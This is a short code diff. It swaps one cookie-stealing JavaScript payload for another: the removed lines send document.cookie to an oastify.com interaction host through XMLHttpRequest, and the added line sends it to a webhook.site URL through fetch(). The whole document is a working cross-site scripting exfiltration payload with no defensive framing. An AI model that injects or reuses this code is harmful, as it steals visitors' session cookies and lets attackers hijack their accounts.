@@ -1,3 +1,1 @@
-var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://5aga9e97aefbrn31l9l2dzzen5twhm5b.oastify.com/?' + document.cookie, true);
-xhttp.send();
+fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
